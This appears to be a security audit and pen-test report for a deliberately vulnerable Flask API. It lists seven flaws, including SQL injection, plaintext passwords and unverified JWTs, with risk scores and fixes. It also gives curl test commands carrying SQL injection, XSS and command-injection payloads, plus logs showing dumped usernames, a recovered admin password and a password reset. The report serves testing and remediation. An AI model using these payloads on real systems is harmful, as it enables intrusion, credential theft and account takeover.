### Security and Logical Vulnerabilities 
## Target is Python Flask backend api running from backend folder

1. **SQL Injection**
   - **Description**: SQL queries are constructed using string concatenation, making the application vulnerable to SQL injection.
   - **Risk**: High
   - **Impact**: An attacker can manipulate the SQL query to gain unauthorized access to the database, retrieve sensitive information, or perform data modification.
   - **Recommendation**: Use parameterized queries or prepared statements.

2. **Plaintext Password Storage**
   - **Description**: Passwords are stored in plaintext in the database.
   - **Risk**: High
   - **Impact**: In case of a database breach, attackers can easily retrieve users' passwords.
   - **Recommendation**: Use a strong hashing algorithm (e.g., bcrypt) to store passwords securely.

3. **Hardcoded Secret Key for JWT**
   - **Description**: The secret key used for JWT token generation is hardcoded in the source code.
   - **Risk**: High
   - **Impact**: If the source code is exposed, attackers can forge tokens.
   - **Recommendation**: Use environment variables to store the secret key securely.

4. **JWT Verification Disabled**
   - **Description**: The `decodeNoneJwt` function decodes JWT tokens without verifying the signature.
   - **Risk**: High
   - **Impact**: Attackers can create their own tokens and bypass authentication.
   - **Recommendation**: Always verify JWT signatures during decoding.

5. **Insufficient Input Validation**
   - **Description**: User inputs are not validated for format, length, or content.
   - **Risk**: Medium
   - **Impact**: This can lead to various attacks like XSS, SQL Injection, and data integrity issues.
   - **Recommendation**: Implement proper input validation and sanitization for all user inputs.

6. **Insecure Use of Ping Command**
   - **Description**: The application executes the `ping` command using user-provided input.
   - **Risk**: High
   - **Impact**: This can be exploited to execute arbitrary commands on the server (Command Injection).
   - **Recommendation**: Validate and sanitize user inputs before using them in system commands.

7. **Weak Error Messages**
   - **Description**: Error messages like `'In correct email or password'` can provide clues to attackers about valid emails or usernames.
   - **Risk**: Low
   - **Impact**: Can assist attackers in brute force or enumeration attacks.
   - **Recommendation**: Use generic error messages like "Invalid credentials" without specifying which part is incorrect.

### Bug Reporting with Risk Scoring

1. **SQL Injection**
   - **Type**: Security
   - **Description**: SQL queries are constructed using string concatenation, making the application vulnerable to SQL injection.
   - **Risk Score**: 9/10
   - **Impact**: Potential data breach, unauthorized access, and data manipulation.
   - **Mitigation**: Use parameterized queries or prepared statements.

2. **Plaintext Password Storage**
   - **Type**: Security
   - **Description**: Passwords are stored in plaintext in the database.
   - **Risk Score**: 10/10
   - **Impact**: High risk of user data compromise in the event of a database breach.
   - **Mitigation**: Store passwords using a strong hashing algorithm (e.g., bcrypt).

3. **Hardcoded Secret Key for JWT**
   - **Type**: Security
   - **Description**: The secret key used for JWT token generation is hardcoded in the source code.
   - **Risk Score**: 10/10
   - **Impact**: If the source code is exposed, attackers can forge tokens.
   - **Mitigation**: Use environment variables to store the secret key securely.

4. **JWT Verification Disabled**
   - **Type**: Security
   - **Description**: The `decodeNoneJwt` function decodes JWT tokens without verifying the signature.
   - **Risk Score**: 10/10
   - **Impact**: Attackers can create their own tokens and bypass authentication.
   - **Mitigation**: Always verify JWT signatures during decoding.

5. **Insufficient Input Validation**
   - **Type**: Security/Logical
   - **Description**: User inputs are not validated for format, length, or content.
   - **Risk Score**: 7/10
   - **Impact**: Potential for XSS, SQL injection, and data integrity issues.
   - **Mitigation**: Implement proper input validation and sanitization.

6. **Insecure Use of Ping Command**
   - **Type**: Security
   - **Description**: The application executes the `ping` command using user-provided input.
   - **Risk Score**: 9/10
   - **Impact**: Potential for command injection attacks.
   - **Mitigation**: Validate and sanitize user inputs before using them in system commands.

7. **Weak Error Messages**
   - **Type**: Security
   - **Description**: Detailed error messages can help attackers in brute force or enumeration attacks.
   - **Risk Score**: 5/10
   - **Impact**: Aids attackers in identifying valid usernames or emails.
   - **Mitigation**: Use generic error messages like "Invalid credentials".

### Curl REST Calls for Testing Vulnerabilities

1. **SQL Injection Testing**
   ```bash
   curl -X POST http://localhost:5500/client_registeration -d 'fullName=John Doe&userName=johndoe&email=test@maildrop.cc" OR "1"="1&password=password&phone=1234567890'

   curl -X POST http://localhost:5500/client_login -d 'userName=spammer&email=spam@email.com"OR 1=1;--&password=pwd'

   jwt() { jq -R 'split(".") | .[1] | @base64d | fromjson' <<< $1; }

   token=$(curl -X POST http://localhost:5000/client_login -d 'userName=spammer&email=spam@email.com" union select password || ":" || email from users;--&password=pwd' | jq -j '.token')
   jwt $token
   ```

2. **Testing Plaintext Password Storage**
   - Validating/Checking the database data to ensure passwords are stored securely.

3. **Testing Hardcoded Secret Key for JWT**
   - Code Reviewing the source code for hardcoded secrets and ensure they are replaced with environment variables.

4. **Testing JWT Verification Disabled**
   ```bash
   token=$(curl -X POST http://localhost:5500/client_login -d 'userName=notestuser&email=test@example.com&password=test' | jq -r '.token')
   curl -X POST http://localhost:5000/update_info -d "token=$token&currentPassword=test&newPassword=newpass"
   ```

5. **Testing Insufficient Input Validation**
   ```bash
   curl -X POST http://localhost:5500/client_registeration -d 'fullName=<script>alert("XSS")</script>&userName=testuser&email=test@example.com&password=test&phone=1234567890'
   ```

6. **Testing Insecure Use of Ping Command**
   ```bash
   curl -X GET http://localhost:5500/products -d 'source=google.com;ls'
   ```

7. **Testing Weak Error Messages**
   ```bash
   curl -X POST http://localhost:5500/client_login -d 'email=nonexistent@example.com&password=wrongpassword'
   ```
### Start Backend Server before running pen-tests
```bash
cd backend # from root folder 
pip install -r requirments.txt
source start-server.sh
```

### Start Tests Script
```bash
cd tests/security-tests # from root folder 
source pen_tests.sh
```

### Pen Test commands with results
```bash
------------------------------------------------
------------------------------------------------

Testing SQL Injection by passing default data validation to access the registration endpoint

curl -X POST http://localhost:5500/client_registeration -d 'fullName=newJohnDoe23743&userName=newjohndoe13696&email=newnoname30128@maildrop.cc" OR "1"="1&password=password&phone=1234567890'

{"data":[["Admin"],["West3411"],["Quigley6570"],["Roberts2374"],["Osinski3384"],["Feest3028"],["Wisozk1672"],["Mertz2908"],["Harber3183"],["Yundt2536"],["Collins6952"],["Leannon7789"],["Leffler9534"],["Huels2278"],["Simonis2708"],["Stroman2539"],["McCullough2882"],["Casper8418"],["Yundt1936"],["Abshire2345"],["Rosenbaum2970"],["Thompson9184"],["Bosco5113"],["Beahan4605"],["Leffler1740"],["Harvey4860"],["Watsica7536"],["Collins3909"],["Senger1714"],["Schaden7258"],["Hamill3792"],["Smitham3405"],["Mayer2084"],["Lakin8019"],["Hane8856"],["Runolfsson7664"],["Langworth9061"],["Paucek3795"],["Pouros1125"],["Dicki4387"],["Mayer6943"],["Streich3572"],["Gislason1540"],["Rice1340"],["Waters3572"],["Champlin3284"],["Donnelly4592"],["Labadie3756"],["Johns2375"],["Roob3056"],["Daugherty6862"],["Olson1899"],["King2133"],["Daniel5174"],["Schaefer2732"],["Schneider3546"],["Pfeffer4073"],["Shanahan3439"],["Hodkiewicz7649"],["Flatley9743"],["Mante4334"],["Blick1247"],["Brown9870"],["Olson8367"],["Kreiger2115"],["Quigley1034"],["Greenholt8838"],["Kilback7330"],["Breitenberg3196"],["Reichel3394"],["Reichel3821"],["Blick4571"],["Rosenbaum5339"],["Conn3916"],["Wintheiser4828"],["Hahn7089"],["Rippin5840"],["Klocko4546"],["Gislason3405"],["Crist9554"],["Altenwerth6902"],["Feil9981"],["Hahn6028"],["Larkin9678"],["Hyatt7344"],["Streich9911"],["Rodriguez6794"],["Morissette9009"]],"msg":"Email already Exist"}
------------------------------------------------
------------------------------------------------

Testing SQL Injection by passing default data validation to access the login endpoint

curl -X POST http://localhost:5500/client_login -d 'userName=spammer&email=spam@email.com"OR 1=1;--&password=pwd'

{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6InNwYW1tZXIiLCJlbWFpbCI6InNwYW1AZW1haWwuY29tXCJPUiAxPTE7LS0iLCJyb2xlIjoxfQ.SfASxL9cTm8uSE0yTC7Wx3ilRmNLRQWOcAGdwXrk5Cs"}
------------------------------------------------
------------------------------------------------

Testing SQL Injection to retrieve account details

curl -X POST http://localhost:5500/client_login -d 'userName=spammer&email=spam@email.com" union select password || ":" || email from users;--&password=pwd'

{
  "userName": "spammer",
  "email": "spam@email.com\" union select password || \":\" || email from users;--",
  "role": "admin@1234:admin@test.com"
}
admin@1234
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6InNwYW1tZXIiLCJlbWFpbCI6InNwYW1AZW1haWwuY29tXCIgdW5pb24gc2VsZWN0IHBhc3N3b3JkIHx8IFwiOlwiIHx8IGVtYWlsIGZyb20gdXNlcnM7LS0iLCJyb2xlIjoiYWRtaW5AMTIzNDphZG1pbkB0ZXN0LmNvbSJ9.Ket7bPwysNf0cmO2YJmg_ZuIyRabd6Byu9ROUq9vnCA
------------------------------------------------
------------------------------------------------

Testing Resetting the password of the retrieved account

curl -X POST http://localhost:5500/update_info -d "token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6InNwYW1tZXIiLCJlbWFpbCI6InNwYW1AZW1haWwuY29tXCIgdW5pb24gc2VsZWN0IHBhc3N3b3JkIHx8IFwiOlwiIHx8IGVtYWlsIGZyb20gdXNlcnM7LS0iLCJyb2xlIjoiYWRtaW5AMTIzNDphZG1pbkB0ZXN0LmNvbSJ9.Ket7bPwysNf0cmO2YJmg_ZuIyRabd6Byu9ROUq9vnCA&currentPassword=admin@1234&newPassword=newpass"

{"msg":"Passowrd Reseted"}
------------------------------------------------
------------------------------------------------

Testing Input Validation

curl -X POST http://localhost:5500/client_registeration -d 'fullName=<script>alert(XSS)</script>&userName=testuser&email=test@example.com&password=test&phone=1234567890'

{"msg":"User Registered"}
------------------------------------------------
------------------------------------------------

Testing Insecure Use of Ping

curl -X GET http://localhost:5500/products -d 'source=google.com;ls'

{"msg":"Error"}
------------------------------------------------
------------------------------------------------
Testing Weak Error Message

curl -X POST http://localhost:5500/client_login -d 'email=nonexistent@example.com&password=wrongpassword'

<!doctype html>
<html lang=en>
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>The browser (or proxy) sent a request that this server could not understand.</p>
-------------------------------------
------------------------------------

```   